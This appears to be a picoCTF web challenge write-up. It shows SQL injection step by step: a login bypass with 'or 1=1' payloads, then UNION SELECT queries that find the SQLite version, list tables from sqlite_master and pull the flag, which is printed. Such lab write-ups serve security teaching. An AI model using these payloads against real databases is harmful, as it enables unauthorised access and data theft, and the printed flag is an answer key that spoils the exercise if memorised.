## Description
Can you find the flag on this website. Try to find the flag here.

## Solution

we are given a login page, providing username and password fields.
by entering user, pass will show us the sql query made to server:


```
username: admin
password: admin
SQL query: SELECT id FROM users WHERE password = 'admin' AND username = 'admin'
```

We can bypass login page simply by below payload:
```
admin' or 1=1 ;--
```

Now we will be redirected to new page with a search box which we can input city names and get related results.

if we input following input, we will get all results at once:
```
a' or 1=1 --
```
So it is sql injection. let's try some queries and get their results.

```
query:  ' union select 1,2,3 --
result: 

City 	Address 	Phone
1	2	3
```

let's find out sql database model (I tried different values like `VERSION, @@version, verion()` But none worked except below):
```
query:	a' union select sqlite_version(),2,3 --

City 	Address 	Phone
3.31.1	2	
```
So database is sqlite, and version of 3.31.1. Now let's get list of table names, and ... to get the flag.

```
query:	a' union select name, 2, 3 FROM sqlite_master WHERE type='table' -- 


City 	Address 	Phone
hints	2	3
more_table	2	3
offices	2	3
users	2	3
```

```
query: 	a' union SELECT sql, 2, 3 FROM sqlite_master WHERE type='table' AND name='more_table' --

City 	Address 	Phone
CREATE TABLE more_table (id INTEGER NOT NULL PRIMARY KEY, flag TEXT)	2	3
```

```
a' union select flag, 2, 3 from more_table --

City 	Address 	Phone
If you are here, you must have seen it	2	3
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_c8b7cc2a}	2	3
```